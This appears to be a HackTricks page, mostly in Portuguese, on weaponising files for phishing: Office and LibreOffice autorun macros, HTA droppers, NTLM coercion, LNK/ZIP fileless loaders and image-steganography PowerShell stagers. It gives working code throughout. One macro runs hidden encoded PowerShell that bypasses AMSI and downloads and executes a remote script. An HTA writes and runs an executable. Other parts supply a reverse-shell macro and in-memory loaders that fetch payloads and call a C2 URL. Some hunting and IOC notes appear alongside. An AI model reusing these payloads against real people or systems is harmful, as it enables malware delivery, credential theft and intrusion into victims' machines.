# Phishing Arquivos & Documentos

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

Microsoft Word realiza validação dos dados do arquivo antes de abri-lo. A validação é feita na forma de identificação da estrutura de dados, de acordo com o padrão OfficeOpenXML. Se algum erro ocorrer durante a identificação da estrutura de dados, o arquivo analisado não será aberto.

Normalmente, arquivos Word contendo macros usam a extensão `.docm`. Entretanto, é possível renomear o arquivo mudando a extensão e ainda manter a capacidade de execução das macros.\
Por exemplo, um arquivo RTF não suporta macros por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
Os mesmos mecanismos internos se aplicam a todo o software da Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
Arquivos DOCX que referenciam um modelo remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros também podem “executar” macros.

### Carregamento Externo de Imagem

Go to: _Insert --> Quick Parts --> Field_\
_**Categorias**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

É possível usar macros para executar arbitrary code a partir do documento.

#### Autoload functions

Quanto mais comuns forem, maior a probabilidade do AV detectá-las.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Remover metadados manualmente

Vá para **Arquivo > Informações > Inspecionar Documento > Inspecionar Documento**, o que abrirá o Document Inspector. Clique em **Inspecionar** e depois em **Remover Tudo** ao lado de **Propriedades do Documento e Informações Pessoais**.

#### Extensão do documento

Quando terminar, selecione o dropdown **Salvar como tipo**, altere o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
Faça isso porque você **não pode salvar macros dentro de um `.docx`** e existe um **estigma** **em torno** da extensão habilitada para macros **`.docm`** (por exemplo, o ícone em miniatura tem um grande `!` e alguns gateways web/email os bloqueiam totalmente). Portanto, essa **extensão legada `.doc` é o melhor compromisso**.

#### Geradores de Macros Maliciosas

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT macros de execução automática (Basic)

Documentos do LibreOffice Writer podem incorporar macros Basic e executá-las automaticamente quando o arquivo é aberto, vinculando a macro ao evento **Abrir Documento** (Ferramentas → Personalizar → Eventos → Abrir Documento → Macro…). Uma macro de reverse shell simples fica assim:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Observe as aspas dobradas (`""`) dentro da string – o LibreOffice Basic as usa para escapar aspas literais, então payloads que terminam com `...==""")` mantêm tanto o comando interno quanto o Shell argument balanceados.

Delivery tips:

- Salve como `.odt` e vincule a macro ao evento do documento para que ela seja executada imediatamente ao abrir.
- Ao enviar por email com `swaks`, use `--attach @resume.odt` (o `@` é necessário para que os bytes do arquivo, e não a string do nome do arquivo, sejam enviados como anexo). Isso é crítico ao abusar de servidores SMTP que aceitam destinatários `RCPT TO` arbitrários sem validação.

## Arquivos HTA

Um HTA é um programa Windows que **combina HTML e linguagens de script (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como uma aplicação "totalmente confiável", sem as restrições do modelo de segurança de um navegador.

Um HTA é executado usando **`mshta.exe`**, que normalmente é **instalado** junto com o **Internet Explorer**, tornando o **`mshta` dependente do IE**. Então, se este tiver sido desinstalado, HTAs ficarão incapazes de serem executados.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forçando autenticação NTLM

Existem várias maneiras de **forçar a autenticação NTLM "remotamente"**, por exemplo, você pode adicionar **imagens invisíveis** a emails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas ao **abrir a pasta.**

**Confira essas ideias e mais nas seguintes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não esqueça que você não pode apenas roubar o hash ou a autenticação, mas também realizar **NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campanhas altamente eficazes entregam um ZIP que contém dois documentos isca legítimos (PDF/DOCX) e um .lnk malicioso. O truque é que o loader PowerShell real é armazenado dentro dos bytes brutos do ZIP após um marcador único, e o .lnk extrai e executa tudo inteiramente em memória.

Fluxo típico implementado pelo one-liner PowerShell do .lnk:

1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, e o diretório pai do diretório de trabalho atual.
2) Ler os bytes do ZIP e encontrar um marcador hardcoded (e.g., xFIQCV). Tudo após o marcador é o payload PowerShell embutido.
3) Copiar o ZIP para %ProgramData%, extrair lá, e abrir o .docx isca para parecer legítimo.
4) Bypassar o AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscar a próxima etapa (e.g., remover todos os caracteres #) e executá-la em memória.

Exemplo de esqueleto PowerShell para extrair e executar a etapa embutida:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- A entrega frequentemente abusa de subdomínios PaaS reputados (p.ex., *.herokuapp.com) e pode restringir payloads (servir ZIPs benignos com base em IP/UA).
- A próxima etapa frequentemente descriptografa base64/XOR shellcode e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos no disco.

Persistência usada na mesma cadeia
- COM TypeLib hijacking do Microsoft Web Browser control para que IE/Explorer ou qualquer app que o incorpore relance automaticamente o payload. Veja detalhes e comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arquivos ZIP contendo a string marcador ASCII (p.ex., xFIQCV) anexada aos dados do arquivo.
- .lnk que enumera pastas parent/user para localizar o ZIP e abre um documento isca.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads de negócio de longa duração que terminam com links hospedados em domínios PaaS confiáveis.

## Steganography-delimited payloads in images (PowerShell stager)

Recentes cadeias de loader entregam um JavaScript/VBS ofuscado que decodifica e executa um PowerShell stager em Base64. Esse stager baixa uma imagem (frequentemente GIF) que contém um .NET DLL codificado em Base64 escondido como texto simples entre marcadores de início/fim únicos. O script procura esses delimitadores (exemplos vistos em ambiente: «<<sudo_png>> … <<sudo_odt>>>»), extrai o texto entre eles, decodifica Base64 para bytes, carrega a assembly in-memory e invoca um método de entrada conhecido com a C2 URL.

Fluxo de trabalho
- Estágio 1: Dropper JS/VBS arquivado → decodifica o Base64 embutido → lança o PowerShell stager com -nop -w hidden -ep bypass.
- Estágio 2: PowerShell stager → baixa a imagem, extrai o Base64 delimitado por marcadores, carrega o .NET DLL in-memory e chama seu método (p.ex., VAI) passando a C2 URL e opções.
- Estágio 3: Loader recupera o payload final e tipicamente o injeta via process hollowing em um binário confiável (comum: MSBuild.exe). Veja mais sobre process hollowing e trusted utility proxy execution aqui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>Extrator de payload stego e loader em PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- Ler o conteúdo do próprio arquivo
- Localizar um blob Base64 entre strings de lixo
- Decodificar para ASCII PowerShell
- Executar com `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Hunting cues
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Consulte a página sobre **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
